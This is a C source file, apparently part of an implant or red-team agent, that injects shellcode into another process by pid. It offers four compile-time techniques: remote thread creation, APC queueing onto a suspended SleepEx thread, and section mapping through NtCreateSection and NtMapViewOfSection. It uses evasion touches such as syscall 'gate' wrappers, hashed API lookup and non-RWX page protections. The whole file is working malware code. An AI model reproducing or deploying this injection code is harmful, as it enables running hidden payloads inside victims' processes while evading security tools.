#include "evasion/injection.h"
#include "common.h"
#include "config.h"

#if INJECTION_TECHNIQUE == INJECT_CRT

static HANDLE inject_crt(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD sc_len) {
    LPVOID remote = gate_VirtualAllocEx(inst, hProcess, NULL, sc_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) return NULL;

    SIZE_T written = 0;
    gate_WriteProcessMemory(inst, hProcess, remote, shellcode, sc_len, &written);

    DWORD old_protect = 0;
#if defined(INCLUDE_EVASION_SMARTINJECT) && !defined(EVASION_USERWX)
    gate_VirtualProtectEx(inst, hProcess, remote, sc_len, PAGE_EXECUTE_READ, &old_protect);
#else
    gate_VirtualProtectEx(inst, hProcess, remote, sc_len, PAGE_EXECUTE_READWRITE, &old_protect);
#endif

    return gate_CreateRemoteThread(inst,
        hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
}

#elif INJECTION_TECHNIQUE == INJECT_APC

static HANDLE inject_apc(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD sc_len) {
    LPVOID remote = gate_VirtualAllocEx(inst, hProcess, NULL, sc_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) return NULL;

    SIZE_T written = 0;
    gate_WriteProcessMemory(inst, hProcess, remote, shellcode, sc_len, &written);

    DWORD old_protect = 0;
#if defined(INCLUDE_EVASION_SMARTINJECT) && !defined(EVASION_USERWX)
    gate_VirtualProtectEx(inst, hProcess, remote, sc_len, PAGE_EXECUTE_READ, &old_protect);
#else
    gate_VirtualProtectEx(inst, hProcess, remote, sc_len, PAGE_EXECUTE_READWRITE, &old_protect);
#endif

    HANDLE hThread = gate_CreateRemoteThread(inst,
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)resolve_function(inst->Modules.Kernel32,
            hash_string_djb2(XSTR("SleepEx"))),
        (LPVOID)(ULONG_PTR)INFINITE, CREATE_SUSPENDED, NULL);

    if (!hThread) return NULL;

    inst->Win32.QueueUserAPC((PAPCFUNC)remote, hThread, 0);
    gate_ResumeThread(inst, hThread);

    return hThread;
}

#elif INJECTION_TECHNIQUE == INJECT_SECTION

static HANDLE inject_section(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD sc_len) {
    if (!inst->Win32.NtCreateSection || !inst->Win32.NtMapViewOfSection ||
        !inst->Win32.NtUnmapViewOfSection || !inst->Win32.CreateRemoteThread)
        return NULL;

    LARGE_INTEGER section_size = {};
    section_size.QuadPart = sc_len;

    HANDLE hSection = NULL;
#if defined(INCLUDE_EVASION_SMARTINJECT) && !defined(EVASION_USERWX)
    DWORD sec_prot = PAGE_EXECUTE_READ;
#else
    DWORD sec_prot = PAGE_EXECUTE_READWRITE;
#endif
    NTSTATUS status = inst->Win32.NtCreateSection(
        &hSection, SECTION_ALL_ACCESS, NULL, &section_size,
        sec_prot, SEC_COMMIT, NULL);
    if (status != 0 || !hSection) return NULL;

    PVOID local_view = NULL;
    SIZE_T view_size = 0;
    status = inst->Win32.NtMapViewOfSection(
        hSection, (HANDLE)(LONG_PTR)-1, &local_view, 0, sc_len, NULL,
        &view_size, 2, 0, PAGE_READWRITE);
    if (status != 0 || !local_view) {
        gate_CloseHandle(inst, hSection);
        return NULL;
    }

    es_memcpy(local_view, shellcode, sc_len);

    PVOID remote_view = NULL;
    SIZE_T remote_view_size = 0;
    status = inst->Win32.NtMapViewOfSection(
        hSection, hProcess, &remote_view, 0, sc_len, NULL,
        &remote_view_size, 2, 0, PAGE_EXECUTE_READ);

    inst->Win32.NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, local_view);
    gate_CloseHandle(inst, hSection);

    if (status != 0 || !remote_view) return NULL;

    return gate_CreateRemoteThread(inst,
        hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote_view, NULL, 0, NULL);
}

#elif INJECTION_TECHNIQUE == INJECT_CUSTOM

static HANDLE inject_custom(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD sc_len) {
    LPVOID remote = gate_VirtualAllocEx(inst, hProcess, NULL, sc_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) return NULL;

    SIZE_T written = 0;
    gate_WriteProcessMemory(inst, hProcess, remote, shellcode, sc_len, &written);

    DWORD old_protect = 0;
#if defined(INCLUDE_EVASION_SMARTINJECT) && !defined(EVASION_USERWX)
    gate_VirtualProtectEx(inst, hProcess, remote, sc_len, PAGE_EXECUTE_READ, &old_protect);
#else
    gate_VirtualProtectEx(inst, hProcess, remote, sc_len, PAGE_EXECUTE_READWRITE, &old_protect);
#endif

    return gate_CreateRemoteThread(inst,
        hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
}

#endif

HANDLE inject_shellcode_into(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD sc_len) {
#if INJECTION_TECHNIQUE == INJECT_CRT
    return inject_crt(inst, hProcess, shellcode, sc_len);
#elif INJECTION_TECHNIQUE == INJECT_APC
    return inject_apc(inst, hProcess, shellcode, sc_len);
#elif INJECTION_TECHNIQUE == INJECT_SECTION
    return inject_section(inst, hProcess, shellcode, sc_len);
#elif INJECTION_TECHNIQUE == INJECT_CUSTOM
    return inject_custom(inst, hProcess, shellcode, sc_len);
#else
    return inject_crt(inst, hProcess, shellcode, sc_len);
#endif
}

BOOL inject_shellcode(PINSTANCE inst, DWORD pid, BYTE* shellcode, DWORD sc_len) {
    HANDLE hProc = gate_OpenProcess(inst, PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return FALSE;

    HANDLE hThread = inject_shellcode_into(inst, hProc, shellcode, sc_len);
    BOOL result = (hThread != NULL);

    if (hThread) gate_CloseHandle(inst, hThread);
    gate_CloseHandle(inst, hProc);
    return result;
}
